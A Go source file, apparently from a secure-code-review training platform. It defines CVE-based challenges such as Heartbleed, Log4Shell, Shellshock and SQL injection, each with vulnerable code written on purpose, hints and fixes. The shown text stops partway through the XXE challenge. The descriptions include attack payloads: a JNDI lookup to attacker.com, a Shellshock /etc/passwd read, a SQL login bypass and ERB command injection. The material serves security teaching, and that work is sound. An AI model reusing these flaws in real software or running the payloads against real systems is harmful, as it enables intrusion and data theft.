package main

// buildCVEChallenges returns 24 challenge seeds based on famous CVEs and
// real-world vulnerability patterns, covering 10+ languages and 12+ categories.
func buildCVEChallenges() []challengeSeed {
	return []challengeSeed{
		cveHeartbleed(),
		cveLog4Shell(),
		cveStrutsOGNL(),
		cveShellshock(),
		cveRustUnsafeUAF(),
		cvePyYAMLDeser(),
		cvePrototypePollution(),
		cvePHPSQLi(),
		cvePythonPickle(),
		cveRubyERBSSTI(),
		cveCSharpXXE(),
		cveGoSSRF(),
		cveNoSQLInjection(),
		cveCFormatString(),
		cveCppUAFVector(),
		cveJavaDeserGadget(),
		cvePythonCmdInjection(),
		cvePHPFileInclusion(),
		cveRustRaceCondition(),
		cveJWTNoneBypass(),
		cveGoPathTraversal(),
		cveCSharpBinaryFormatter(),
		cvePythonSSRF(),
		cveCIntegerOverflow(),
	}
}

// ──────────────────────────────────────────────────
// CVE-2014-0160: Heartbleed — OpenSSL OOB Read
// ──────────────────────────────────────────────────
func cveHeartbleed() challengeSeed {
	return challengeSeed{
		title:      "Heartbleed — OpenSSL Heartbeat OOB Read",
		slug:       "c-heartbleed-oob-read",
		difficulty: 7,
		langSlug:   "c",
		catSlug:    "memory-corruption",
		points:     350,
		cveReference: "CVE-2014-0160",
		description: "A simplified model of the infamous Heartbleed bug in OpenSSL's TLS heartbeat extension. The server reads a client-supplied length field and copies that many bytes from memory into the response — without verifying the length matches the actual payload size. This out-of-bounds read can leak private keys, session tokens, and other secrets from server memory.",
		hints: []string{
			"Look at how the response payload length is determined.",
			"The client sends a 'length' field — is it ever validated against the actual data received?",
			"Compare 'payload_length' from the request with the actual number of bytes in 'payload'.",
		},
		vulnerableLines: []int{30, 31, 32, 33},
		code: `#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>

#define MAX_HEARTBEAT_SIZE 16384

typedef struct {
    uint8_t  type;
    uint16_t payload_length;
    uint8_t  payload[MAX_HEARTBEAT_SIZE];
} HeartbeatRequest;

typedef struct {
    uint8_t  type;
    uint16_t payload_length;
    uint8_t  payload[MAX_HEARTBEAT_SIZE];
} HeartbeatResponse;

/* Process an incoming TLS Heartbeat request and echo the payload back */
int process_heartbeat(const uint8_t *request_buf, size_t request_len,
                      uint8_t *response_buf, size_t *response_len) {
    HeartbeatRequest *req = (HeartbeatRequest *)request_buf;

    uint16_t payload_length = ntohs(req->payload_length);
    uint8_t *payload = req->payload;

    /* BUG: We trust the client-supplied payload_length without checking
       it against the actual received request size. */
    HeartbeatResponse *resp = (HeartbeatResponse *)response_buf;
    resp->type = req->type;
    resp->payload_length = req->payload_length;
    memcpy(resp->payload, payload, payload_length);

    *response_len = 3 + payload_length;
    return 0;
}

int main(void) {
    /* Simulate a malicious heartbeat: claims 256 bytes but sends only 3 */
    uint8_t request[512];
    memset(request, 0, sizeof(request));
    request[0] = 1;           /* type: request */
    request[1] = 0x01;        /* payload_length high byte */
    request[2] = 0x00;        /* payload_length = 256 */
    memcpy(request + 3, "Hi", 2);  /* actual payload: only 2 bytes */

    uint8_t response[MAX_HEARTBEAT_SIZE + 16];
    size_t resp_len;
    process_heartbeat(request, 5, response, &resp_len);

    printf("Response length: %zu (leaked %zu extra bytes)\n",
           resp_len, resp_len - 5);
    return 0;
}`,
		targetVuln:    "Out-of-bounds read due to trusting the client-supplied payload_length field in the TLS Heartbeat request without validating it against the actual received data size. The memcpy copies payload_length bytes from server memory, potentially leaking sensitive data far beyond the actual payload.",
		conceptualFix: "Before copying the payload, validate that payload_length does not exceed the actual number of bytes received in the request (request_len - 3 for the header). If payload_length is larger than the actual data, reject the request or clamp it to the real size.",
	}
}

// ──────────────────────────────────────────────────
// CVE-2021-44228: Log4Shell — JNDI Lookup RCE
// ──────────────────────────────────────────────────
func cveLog4Shell() challengeSeed {
	return challengeSeed{
		title:      "Log4Shell — JNDI Lookup Remote Code Execution",
		slug:       "java-log4shell-jndi",
		difficulty: 8,
		langSlug:   "java",
		catSlug:    "rce",
		points:     400,
		cveReference: "CVE-2021-44228",
		description: "A simplified model of the Log4Shell vulnerability. The application logs user-controlled input (the User-Agent header) using a logging framework that supports JNDI lookup syntax. When the logger encounters a string like ${jndi:ldap://attacker.com/exploit}, it resolves the JNDI reference, connecting to an attacker-controlled server and potentially executing arbitrary code.",
		hints: []string{
			"Look at what data is being passed directly into the logger.",
			"The User-Agent header comes from the client — what happens when the logger processes special syntax in it?",
			"Research JNDI lookup strings like ${jndi:ldap://...} and how Log4j processes them.",
		},
		vulnerableLines: []int{30, 31, 44, 45},
		code: `import javax.servlet.http.*;
import javax.servlet.annotation.*;
import java.io.*;
import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;

@WebServlet("/api/login")
public class LoginServlet extends HttpServlet {

    private static final Logger logger = LogManager.getLogger(LoginServlet.class);

    private final AuthService authService = new AuthService();

    @Override
    protected void doPost(HttpServletRequest request,
                          HttpServletResponse response)
            throws IOException {

        String username = request.getParameter("username");
        String password = request.getParameter("password");
        String userAgent = request.getHeader("User-Agent");
        String clientIP = request.getRemoteAddr();

        response.setContentType("application/json");
        PrintWriter out = response.getWriter();

        /* Log the login attempt with client metadata.
           The logger processes lookup patterns like ${jndi:...}
           in any part of the message string. */
        logger.info("Login attempt from {} [UA: {}] for user: {}",
                     clientIP, userAgent, username);

        try {
            boolean success = authService.authenticate(username, password);
            if (success) {
                logger.info("Successful login for user: {}", username);
                out.println("{\"status\": \"success\"}");
            } else {
                logger.warn("Failed login for user: {}", username);
                out.println("{\"status\": \"failed\"}");
            }
        } catch (Exception e) {
            logger.error("Login error for user {}: {}",
                          username, e.getMessage());
            response.setStatus(500);
            out.println("{\"status\": \"error\"}");
        }
    }
}`,
		targetVuln:    "User-controlled input (User-Agent header, username) is passed directly to Log4j's logger.info() without sanitization. Log4j 2.x evaluates JNDI lookup expressions like ${jndi:ldap://attacker.com/a} embedded in log messages, allowing an attacker to trigger a remote JNDI/LDAP connection and achieve remote code execution.",
		conceptualFix: "Upgrade Log4j to version 2.17.0+ which disables JNDI lookups by default. As defense-in-depth: set the system property log4j2.formatMsgNoLookups=true, sanitize or encode user input before logging, and restrict outbound network connections from the application server.",
	}
}

// ──────────────────────────────────────────────────
// CVE-2017-5638: Equifax Apache Struts — OGNL Injection
// ──────────────────────────────────────────────────
func cveStrutsOGNL() challengeSeed {
	return challengeSeed{
		title:      "Equifax Struts — OGNL Expression Injection",
		slug:       "java-struts-ognl-rce",
		difficulty: 8,
		langSlug:   "java",
		catSlug:    "rce",
		points:     400,
		cveReference: "CVE-2017-5638",
		description: "A model of the Apache Struts Content-Type header OGNL injection vulnerability that led to the Equifax breach. The multipart parser reads the Content-Type header and, upon encountering an error, interpolates the header value through the OGNL expression engine — allowing arbitrary code execution via a crafted Content-Type.",
		hints: []string{
			"Look at how the Content-Type header is used after the parsing error.",
			"The error message includes the raw Content-Type value — what does the framework do with error messages?",
			"OGNL expressions like %{...} in Struts error messages get evaluated by the expression engine.",
		},
		vulnerableLines: []int{28, 29, 30, 31, 32, 33},
		code: `import com.opensymphony.xwork2.ActionSupport;
import org.apache.struts2.dispatcher.multipart.MultiPartRequest;
import org.apache.struts2.interceptor.ServletRequestAware;
import javax.servlet.http.HttpServletRequest;
import java.io.File;
import java.util.List;

public class FileUploadAction extends ActionSupport
        implements ServletRequestAware {

    private File uploadedFile;
    private String uploadedFileContentType;
    private String uploadedFileName;
    private HttpServletRequest servletRequest;

    @Override
    public void setServletRequest(HttpServletRequest request) {
        this.servletRequest = request;
    }

    @Override
    public String execute() throws Exception {
        String contentType = servletRequest.getContentType();

        /* Attempt to parse the multipart request.
           On failure, the raw Content-Type is included in the error message
           which Struts evaluates through the OGNL expression engine. */
        if (contentType == null || !contentType.contains("multipart/form-data")) {
            String errorMsg = "Invalid content type: " + contentType +
                              " — expected multipart/form-data";
            addActionError(errorMsg);
            return ERROR;
        }

        try {
            MultiPartRequest multiWrapper = getMultiPartRequest();
            List<String> errors = multiWrapper.getErrors();
            if (!errors.isEmpty()) {
                for (String err : errors) {
                    addActionError(err);
                }
                return ERROR;
            }

            if (uploadedFile != null) {
                processFile(uploadedFile, uploadedFileName);
                addActionMessage("File uploaded successfully: " + uploadedFileName);
                return SUCCESS;
            }
        } catch (Exception e) {
            addActionError("Upload failed: " + e.getMessage());
            return ERROR;
        }
        return INPUT;
    }

    private void processFile(File file, String name) { /* ... */ }
    private MultiPartRequest getMultiPartRequest() { return null; }

    // Standard getters and setters
    public void setUploadedFile(File file) { this.uploadedFile = file; }
    public void setUploadedFileContentType(String ct) { this.uploadedFileContentType = ct; }
    public void setUploadedFileName(String fn) { this.uploadedFileName = fn; }
}`,
		targetVuln:    "The raw Content-Type header value from the HTTP request is directly concatenated into an error message string passed to addActionError(). In vulnerable versions of Apache Struts 2, error messages are evaluated through the OGNL expression engine, so an attacker can inject OGNL expressions like %{(#cmd='id')(#iswin=(@java.lang.System@getProperty('os.name')...)} in the Content-Type header to achieve remote code execution.",
		conceptualFix: "Upgrade Apache Struts to version 2.5.10.1+ or 2.3.32+ which sanitize error messages before OGNL evaluation. As defense-in-depth, never include raw user input in framework error messages, and configure Struts to disable dynamic method invocation and OGNL expression evaluation in error messages.",
	}
}

// ──────────────────────────────────────────────────
// CVE-2014-6271: Shellshock — Bash Environment Injection
// ──────────────────────────────────────────────────
func cveShellshock() challengeSeed {
	return challengeSeed{
		title:      "Shellshock — Bash Environment Variable Injection",
		slug:       "c-shellshock-env",
		difficulty: 6,
		langSlug:   "c",
		catSlug:    "cmd-injection",
		points:     300,
		cveReference: "CVE-2014-6271",
		description: "A model of the Shellshock vulnerability. This CGI script passes the HTTP User-Agent header as an environment variable to a bash subprocess. Due to Bash's function import mechanism, a specially crafted environment variable value like '() { :; }; /bin/cat /etc/passwd' causes Bash to execute trailing commands after the function definition.",
		hints: []string{
			"Look at which HTTP header is placed into an environment variable.",
			"How does Bash handle environment variables that start with '() {'?",
			"The User-Agent is set as an env var before spawning bash — research CVE-2014-6271.",
		},
		vulnerableLines: []int{25, 26, 27, 28, 29, 30},
		code: `#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

#define MAX_HEADER 4096

/* Simple CGI handler that logs visitor info via a shell script */
int main(void) {
    char *method      = getenv("REQUEST_METHOD");
    char *query       = getenv("QUERY_STRING");
    char *user_agent  = getenv("HTTP_USER_AGENT");
    char *remote_addr = getenv("REMOTE_ADDR");

    /* Output CGI response headers */
    printf("Content-Type: text/html\r\n\r\n");
    printf("<html><body>\n");
    printf("<h1>System Status</h1>\n");

    /* Build the environment for the logging subprocess.
       We pass the User-Agent through as an environment variable,
       and bash will parse it when the subprocess starts. */
    char env_var[MAX_HEADER];
    snprintf(env_var, sizeof(env_var), "HTTP_UA=%s",
             user_agent ? user_agent : "unknown");
    putenv(env_var);

    /* Execute the logging script through bash.
       Bash imports function definitions from environment variables
       matching the pattern () { ... }; and any trailing commands execute. */
    system("/bin/bash /opt/scripts/log_visit.sh");

    printf("<p>Request logged successfully.</p>\n");

    /* Display server uptime */
    printf("<h2>Server Uptime</h2><pre>\n");
    fflush(stdout);
    system("uptime");
    printf("</pre>\n");

    printf("</body></html>\n");
    return 0;
}`,
		targetVuln:    "The HTTP User-Agent header is placed directly into an environment variable (HTTP_UA) via putenv() without any sanitization, then system() is called to spawn bash. Bash versions before 4.3 patch 25 automatically parse environment variables starting with '() {' as function definitions and execute any commands trailing the function body. An attacker can set User-Agent to '() { :; }; malicious_command' to achieve remote code execution.",
		conceptualFix: "Sanitize all environment variable values by stripping or rejecting any that begin with '() {'. Upgrade Bash to a patched version (4.3 patch 25+). Use execve() instead of system() to avoid shell interpretation. Better yet, avoid passing user-controlled data through environment variables to shell processes entirely.",
	}
}

// ──────────────────────────────────────────────────
// Rust Unsafe: Use-After-Free via raw pointers
// ──────────────────────────────────────────────────
func cveRustUnsafeUAF() challengeSeed {
	return challengeSeed{
		title:      "Rust Unsafe — Use-After-Free via Raw Pointers",
		slug:       "rust-unsafe-uaf",
		difficulty: 7,
		langSlug:   "rust",
		catSlug:    "memory-corruption",
		points:     350,
		description: "This Rust connection pool implementation uses unsafe code to manage connection objects via raw pointers. After a connection is returned to the pool, the original raw pointer is still accessible and used — creating a classic use-after-free condition that bypasses Rust's ownership guarantees.",
		hints: []string{
			"Examine the lifecycle of raw pointers created from Box::into_raw.",
			"What happens to 'conn_ptr' after release_connection is called?",
			"After release, the connection is back in the pool — but the caller still holds a raw pointer to it.",
		},
		vulnerableLines: []int{38, 39, 40, 55, 56, 57, 58},
		code: `use std::collections::VecDeque;
use std::ptr;

struct Connection {
    id: u32,
    buffer: Vec<u8>,
    is_active: bool,
}

struct ConnectionPool {
    connections: VecDeque<Box<Connection>>,
    max_size: usize,
}

impl ConnectionPool {
    fn new(max_size: usize) -> Self {
        let mut pool = ConnectionPool {
            connections: VecDeque::new(),
            max_size,
        };
        for i in 0..max_size {
            pool.connections.push_back(Box::new(Connection {
                id: i as u32,
                buffer: vec![0u8; 1024],
                is_active: false,
            }));
        }
        pool
    }

    /// Acquire a connection, returning a raw pointer for "performance"
    fn acquire_connection(&mut self) -> *mut Connection {
        if let Some(mut conn) = self.connections.pop_front() {
            conn.is_active = true;
            /* Convert the Box into a raw pointer — caller is responsible
               for memory, but the pool doesn't track this properly */
            let ptr = Box::into_raw(conn);
            ptr
        } else {
            ptr::null_mut()
        }
    }

    /// Release a connection back into the pool
    fn release_connection(&mut self, conn_ptr: *mut Connection) {
        if conn_ptr.is_null() {
            return;
        }
        unsafe {
            /* Reconstruct the Box from the raw pointer and push it back.
               This takes ownership, but the caller may still hold conn_ptr. */
            let mut conn = Box::from_raw(conn_ptr);
            conn.is_active = false;
            conn.buffer.clear();
            self.connections.push_back(conn);
        }
    }
}

fn main() {
    let mut pool = ConnectionPool::new(4);

    let conn_ptr = pool.acquire_connection();

    unsafe {
        (*conn_ptr).buffer.extend_from_slice(b"SELECT * FROM users");
    }

    /* Release the connection back to the pool */
    pool.release_connection(conn_ptr);

    /* BUG: Use-after-free — conn_ptr is still used after release.
       The memory may have been reallocated to another connection. */
    unsafe {
        println!("Buffer after release: {:?}", (*conn_ptr).buffer);
        (*conn_ptr).buffer.extend_from_slice(b"; DROP TABLE users");
    }
}`,
		targetVuln:    "The connection pool uses Box::into_raw() to hand out raw pointers and Box::from_raw() to reclaim them on release. After release_connection() is called, the caller still holds the raw pointer (conn_ptr) and continues to dereference it — a classic use-after-free. The memory backing that connection may be reallocated or reused, causing data corruption or undefined behavior that bypasses Rust's usual safety guarantees.",
		conceptualFix: "Avoid using raw pointers for connection pool management. Instead, use safe Rust patterns: return a guard type (similar to MutexGuard) that implements Drop to automatically return connections to the pool. Alternatively, use Arc<Mutex<Connection>> for shared ownership with proper lifetime tracking. If unsafe is truly needed, use a generational index pattern to invalidate stale references.",
	}
}

// ──────────────────────────────────────────────────
// CVE-2020-1747: PyYAML Deserialization RCE
// ──────────────────────────────────────────────────
func cvePyYAMLDeser() challengeSeed {
	return challengeSeed{
		title:      "PyYAML — Unsafe YAML Deserialization RCE",
		slug:       "python-pyyaml-deser",
		difficulty: 5,
		langSlug:   "python",
		catSlug:    "insecure-deser",
		points:     250,
		cveReference: "CVE-2020-1747",
		description: "This configuration management API accepts YAML payloads to update application settings. It uses yaml.load() with the default FullLoader, which can instantiate arbitrary Python objects from YAML tags — allowing an attacker to execute arbitrary commands on the server.",
		hints: []string{
			"Look at which yaml.load() variant is being used.",
			"What YAML tags can trigger Python object instantiation?",
			"Compare yaml.load() vs yaml.safe_load() — which one restricts object creation?",
		},
		vulnerableLines: []int{24, 25},
		code: `from flask import Flask, request, jsonify
import yaml
import os
import logging

app = Flask(__name__)
logger = logging.getLogger(__name__)

# In-memory config store
current_config = {
    "app_name": "MyService",
    "debug": False,
    "max_connections": 100,
    "log_level": "INFO",
}

@app.route("/api/config", methods=["GET"])
def get_config():
    return jsonify(current_config)

@app.route("/api/config", methods=["PUT"])
def update_config():
    raw_body = request.get_data(as_text=True)
    try:
        new_config = yaml.load(raw_body, Loader=yaml.FullLoader)
    except yaml.YAMLError as e:
        return jsonify({"error": f"Invalid YAML: {e}"}), 400

    if not isinstance(new_config, dict):
        return jsonify({"error": "Config must be a YAML mapping"}), 400

    # Validate expected keys
    allowed_keys = {"app_name", "debug", "max_connections", "log_level"}
    unknown = set(new_config.keys()) - allowed_keys
    if unknown:
        return jsonify({"error": f"Unknown keys: {unknown}"}), 400

    current_config.update(new_config)
    logger.info("Config updated: %s", new_config)
    return jsonify({"status": "updated", "config": current_config})

@app.route("/api/config/import", methods=["POST"])
def import_config_file():
    """Import config from an uploaded YAML file."""
    if "file" not in request.files:
        return jsonify({"error": "No file provided"}), 400

    f = request.files["file"]
    content = f.read().decode("utf-8")
    try:
        imported = yaml.load(content, Loader=yaml.FullLoader)
    except yaml.YAMLError as e:
        return jsonify({"error": f"Invalid YAML: {e}"}), 400

    if isinstance(imported, dict):
        current_config.update(imported)
        return jsonify({"status": "imported", "config": current_config})
    return jsonify({"error": "Invalid config format"}), 400

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=5000)`,
		targetVuln:    "Both endpoints use yaml.load() with yaml.FullLoader to parse user-supplied YAML data. FullLoader allows instantiation of arbitrary Python objects via YAML tags like !!python/object/apply:os.system. An attacker can submit a YAML payload containing malicious tags to execute arbitrary OS commands on the server.",
		conceptualFix: "Replace yaml.load(data, Loader=yaml.FullLoader) with yaml.safe_load(data). SafeLoader only constructs basic Python types (str, int, list, dict) and refuses to instantiate arbitrary objects. This completely prevents YAML deserialization attacks.",
	}
}

// ──────────────────────────────────────────────────
// CVE-2019-10744: Prototype Pollution in lodash
// ──────────────────────────────────────────────────
func cvePrototypePollution() challengeSeed {
	return challengeSeed{
		title:      "Prototype Pollution — Deep Merge Admin Escalation",
		slug:       "nodejs-prototype-pollution",
		difficulty: 5,
		langSlug:   "nodejs",
		catSlug:    "prototype-pollution",
		points:     250,
		cveReference: "CVE-2019-10744",
		description: "This Express.js user profile API allows deep merging of user-supplied JSON objects into stored profiles. The custom deepMerge function recursively copies properties without checking for prototype-polluting keys like '__proto__' or 'constructor' — allowing an attacker to inject properties into Object.prototype that affect all objects in the application, including the isAdmin check.",
		hints: []string{
			"Look at the deepMerge function — what keys does it accept?",
			"What happens if the user sends a JSON body with '__proto__' as a key?",
			"How does modifying Object.prototype affect the 'isAdmin' property check on other objects?",
		},
		vulnerableLines: []int{8, 9, 10, 11, 12, 13, 14, 15},
		code: `const express = require('express');
const app = express();
app.use(express.json());

const users = new Map();

/* Custom deep merge — recursively copies source properties into target */
function deepMerge(target, source) {
  for (const key of Object.keys(source)) {
    if (typeof source[key] === 'object' && source[key] !== null
        && typeof target[key] === 'object' && target[key] !== null) {
      deepMerge(target[key], source[key]);
    } else {
      target[key] = source[key];
    }
  }
  return target;
}

/* Seed some test users */
users.set('alice', { name: 'Alice', email: 'alice@example.com', role: 'user' });
users.set('bob',   { name: 'Bob',   email: 'bob@example.com',   role: 'user' });

app.get('/api/user/:id', (req, res) => {
  const user = users.get(req.params.id);
  if (!user) return res.status(404).json({ error: 'User not found' });
  res.json(user);
});

/* Update user profile via deep merge */
app.patch('/api/user/:id', (req, res) => {
  const user = users.get(req.params.id);
  if (!user) return res.status(404).json({ error: 'User not found' });

  deepMerge(user, req.body);
  res.json({ status: 'updated', user });
});

/* Admin-only endpoint */
app.delete('/api/user/:id', (req, res) => {
  const caller = users.get(req.headers['x-user-id']);
  if (!caller || !caller.isAdmin) {
    return res.status(403).json({ error: 'Admin access required' });
  }
  users.delete(req.params.id);
  res.json({ status: 'deleted' });
});

app.listen(3000, () => console.log('Server on :3000'));`,
		targetVuln:    "The deepMerge function recursively assigns all properties from user-supplied JSON to existing objects without filtering dangerous keys like '__proto__', 'constructor', or 'prototype'. An attacker can send {\"__proto__\": {\"isAdmin\": true}} which pollutes Object.prototype, causing all objects to inherit isAdmin=true — bypassing the admin check in the delete endpoint.",
		conceptualFix: "In the deepMerge function, skip dangerous prototype-polluting keys: check that key is not '__proto__', 'constructor', or 'prototype' before recursing or assigning. Alternatively, use Object.create(null) for data objects, or use a safe merge library. Validate that incoming JSON does not contain these keys at the API boundary.",
	}
}

// ──────────────────────────────────────────────────
// PHP SQL Injection in login
// ──────────────────────────────────────────────────
func cvePHPSQLi() challengeSeed {
	return challengeSeed{
		title:      "PHP Login — PDO SQL Injection via String Concat",
		slug:       "php-sqli-login",
		difficulty: 3,
		langSlug:   "php",
		catSlug:    "injection",
		points:     150,
		description: "A PHP login endpoint uses PDO but defeats its protection by concatenating user input directly into the SQL query string instead of using parameterized queries. This classic mistake allows SQL injection despite using a modern database abstraction layer.",
		hints: []string{
			"Look at how the SQL query is constructed — is it using prepared statements?",
			"PDO supports parameterized queries, but is this code using them?",
			"The $username variable is concatenated directly into the SQL string.",
		},
		vulnerableLines: []int{24, 25, 26},
		code: `<?php
require_once __DIR__ . '/config/database.php';

class AuthController {
    private PDO $db;

    public function __construct(PDO $db) {
        $this->db = $db;
    }

    public function login(): array {
        $username = $_POST['username'] ?? '';
        $password = $_POST['password'] ?? '';

        if (empty($username) || empty($password)) {
            return ['error' => 'Username and password are required'];
        }

        // Validate username format
        if (strlen($username) > 50) {
            return ['error' => 'Username too long'];
        }

        // BUG: String concatenation instead of prepared statement
        $sql = "SELECT id, username, password_hash, role FROM users " .
               "WHERE username = '" . $username . "' AND active = 1";
        $stmt = $this->db->query($sql);
        $user = $stmt->fetch(PDO::FETCH_ASSOC);

        if (!$user) {
            return ['error' => 'Invalid credentials'];
        }

        if (!password_verify($password, $user['password_hash'])) {
            return ['error' => 'Invalid credentials'];
        }

        // Start session
        session_start();
        $_SESSION['user_id'] = $user['id'];
        $_SESSION['username'] = $user['username'];
        $_SESSION['role'] = $user['role'];

        return [
            'status' => 'success',
            'user' => [
                'id' => $user['id'],
                'username' => $user['username'],
                'role' => $user['role'],
            ]
        ];
    }
}

// Route handler
header('Content-Type: application/json');
$db = new PDO($dsn, $dbUser, $dbPass, [PDO::ATTR_ERRMODE => PDO::ERRMODE_EXCEPTION]);
$auth = new AuthController($db);
echo json_encode($auth->login());`,
		targetVuln:    "The SQL query is built by concatenating the $username variable directly into the query string instead of using PDO prepared statements with parameter binding. An attacker can input a username like ' OR '1'='1' -- to bypass authentication and log in as any user.",
		conceptualFix: "Use PDO prepared statements with parameter binding: $stmt = $this->db->prepare('SELECT ... WHERE username = ? AND active = 1'); $stmt->execute([$username]); This ensures user input is treated as data, never as SQL code.",
	}
}

// ──────────────────────────────────────────────────
// Python Pickle Deserialization
// ──────────────────────────────────────────────────
func cvePythonPickle() challengeSeed {
	return challengeSeed{
		title:      "Python Pickle — Insecure Deserialization RCE",
		slug:       "python-pickle-deser",
		difficulty: 5,
		langSlug:   "python",
		catSlug:    "insecure-deser",
		points:     250,
		description: "This caching service uses Python's pickle module to serialize and deserialize cached objects from a Redis-backed store. An attacker who can control the cached data (e.g., via a cache poisoning attack) can inject a malicious pickle payload that executes arbitrary code when deserialized.",
		hints: []string{
			"Look at what serialization format is used for storing and loading cache entries.",
			"Python's pickle module can instantiate arbitrary objects during deserialization.",
			"What if an attacker can write to the cache backend directly?",
		},
		vulnerableLines: []int{28, 29, 42, 43},
		code: `import pickle
import redis
import hashlib
import logging
from flask import Flask, request, jsonify

app = Flask(__name__)
logger = logging.getLogger(__name__)
cache = redis.Redis(host='localhost', port=6379, db=0)

CACHE_TTL = 3600  # 1 hour

def cache_key(endpoint: str, params: dict) -> str:
    """Generate a deterministic cache key."""
    raw = f"{endpoint}:{sorted(params.items())}"
    return f"cache:{hashlib.sha256(raw.encode()).hexdigest()}"

def get_cached(key: str):
    """Retrieve and deserialize a cached object."""
    data = cache.get(key)
    if data is None:
        return None
    try:
        # BUG: pickle.loads deserializes arbitrary Python objects.
        # If an attacker can poison the cache, they can inject
        # a crafted pickle payload for remote code execution.
        return pickle.loads(data)
    except Exception as e:
        logger.warning("Cache deserialize error: %s", e)
        return None

def set_cached(key: str, value, ttl: int = CACHE_TTL):
    """Serialize and store an object in cache."""
    try:
        cache.setex(key, ttl, pickle.dumps(value))
    except Exception as e:
        logger.warning("Cache serialize error: %s", e)

@app.route("/api/reports/<report_id>")
def get_report(report_id):
    key = cache_key("report", {"id": report_id})

    cached = get_cached(key)
    if cached:
        return jsonify(cached)

    # Simulate fetching from database
    report = fetch_report_from_db(report_id)
    if not report:
        return jsonify({"error": "Not found"}), 404

    set_cached(key, report)
    return jsonify(report)

def fetch_report_from_db(report_id):
    # Placeholder for actual DB query
    return {"id": report_id, "title": "Q4 Report", "status": "complete"}

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=5000)`,
		targetVuln:    "The caching layer uses pickle.loads() to deserialize data from Redis. Python's pickle module can execute arbitrary code during deserialization via the __reduce__ method. If an attacker can write to the Redis instance (misconfiguration, SSRF, or direct access), they can inject a malicious pickle payload that executes arbitrary commands when a cached entry is read.",
		conceptualFix: "Replace pickle with a safe serialization format like JSON (json.dumps/json.loads) for cached data. If complex object serialization is needed, use a format with a strict schema (e.g., msgpack with known types). Never deserialize untrusted data with pickle. Additionally, secure the Redis instance with authentication and network isolation.",
	}
}

// ──────────────────────────────────────────────────
// Ruby ERB Server-Side Template Injection
// ──────────────────────────────────────────────────
func cveRubyERBSSTI() challengeSeed {
	return challengeSeed{
		title:      "Ruby ERB — Server-Side Template Injection",
		slug:       "ruby-erb-ssti",
		difficulty: 6,
		langSlug:   "ruby",
		catSlug:    "rce",
		points:     300,
		description: "This Sinatra web application renders user-supplied input directly through the ERB template engine. An attacker can inject ERB template syntax (<%= ... %>) to execute arbitrary Ruby code on the server, reading files, executing system commands, or accessing application secrets.",
		hints: []string{
			"Look at how the user's input reaches the ERB rendering engine.",
			"What happens when ERB processes a string containing '<%= ... %>'?",
			"The template variable is constructed from user input and rendered via ERB.new().result.",
		},
		vulnerableLines: []int{30, 31, 32, 33},
		code: `require 'sinatra'
require 'erb'
require 'cgi'

set :port, 4567

# In-memory store for user greeting templates
user_templates = {}

get '/' do
  erb :index
end

# Save a custom greeting template
post '/greeting' do
  username = params[:username]
  template = params[:template]

  unless username && template
    halt 400, { error: 'Missing username or template' }.to_json
  end

  user_templates[username] = template
  { status: 'saved' }.to_json
end

# Render the user's greeting
get '/greeting/:username' do
  template_str = user_templates[params[:username]]
  halt 404, { error: 'No template found' }.to_json unless template_str

  # BUG: User-controlled string is rendered as an ERB template
  rendered = ERB.new(template_str).result(binding)
  content_type :html
  "<html><body><h1>#{rendered}</h1></body></html>"
end

# Example templates page
get '/examples' do
  examples = [
    { name: 'Simple', template: 'Hello, World!' },
    { name: 'With date', template: 'Today is <%= Time.now.strftime("%B %d, %Y") %>' },
    { name: 'Personal', template: 'Welcome back, <%= username %>!' },
  ]
  content_type :json
  examples.to_json
end`,
		targetVuln:    "User-supplied template strings are passed directly to ERB.new().result(binding), which evaluates embedded Ruby expressions. An attacker can store a template like '<%= system(\"id\") %>' or '<%= File.read(\"/etc/passwd\") %>' which will execute arbitrary Ruby code when the greeting is rendered. The use of binding exposes all local variables and methods to the template.",
		conceptualFix: "Never pass user-controlled strings to a server-side template engine. Use a sandboxed template engine like Liquid that doesn't allow arbitrary code execution. If ERB is required, use a restricted binding with no access to system methods, and whitelist only safe template variables. Alternatively, treat user templates as plain text with simple variable substitution (e.g., replace {{name}} tokens) instead of ERB evaluation.",
	}
}

// ──────────────────────────────────────────────────
// C# XML External Entity (XXE) Injection
// ──────────────────────────────────────────────────
func cveCSharpXXE() challengeSeed {
	return challengeSeed{
		title:      "C# XML External Entity (XXE) Injection",
		slug:       "csharp-xml-xxe",
		difficulty: 5,
		langSlug:   "csharp",
		catSlug:    "injection",
		points:     250,
		description: "This C# API endpoint parses XML order data using XmlDocument with default settings. The default configuration allows processing of external entities, enabling an attacker to include DTD declarations that read local files, perform SSRF, or cause denial of service via entity expansion.",
		hints: []string{
			"Check the XmlDocument configuration — is DTD processing disabled?",
			"What does the XmlResolver property control?",
			"An XML document with a <!DOCTYPE> containing ENTITY declarations can read local files.",
		},
		vulnerableLines: []int{26, 27, 28, 29},
		code: `using System;
using System.Xml;
using System.IO;
using Microsoft.AspNetCore.Mvc;

namespace OrderService.Controllers
{
    [ApiController]
    [Route("api/[controller]")]
    public class OrdersController : ControllerBase
    {
        private readonly IOrderRepository _repository;

        public OrdersController(IOrderRepository repository)
        {
            _repository = repository;
        }

        [HttpPost("import")]
        public IActionResult ImportOrder()
        {
            using var reader = new StreamReader(Request.Body);
            string xmlContent = reader.ReadToEnd();

            // BUG: XmlDocument with default settings allows XXE
            var xmlDoc = new XmlDocument();
            xmlDoc.XmlResolver = new XmlUrlResolver();
            xmlDoc.LoadXml(xmlContent);

            var orderNode = xmlDoc.SelectSingleNode("//order");
            if (orderNode == null)
                return BadRequest(new { error = "Invalid order XML" });

            var order = new Order
            {
                CustomerId = orderNode.SelectSingleNode("customer_id")?.InnerText,
                Product = orderNode.SelectSingleNode("product")?.InnerText,
                Quantity = int.Parse(orderNode.SelectSingleNode("quantity")?.InnerText ?? "0"),
                Notes = orderNode.SelectSingleNode("notes")?.InnerText,
            };

            _repository.Save(order);
            return Ok(new { status = "imported", orderId = order.Id });
        }

        [HttpGet("{id}")]
        public IActionResult GetOrder(string id)
        {
            var order = _repository.FindById(id);
            if (order == null)
                return NotFound();
            return Ok(order);
        }
    }
}`,
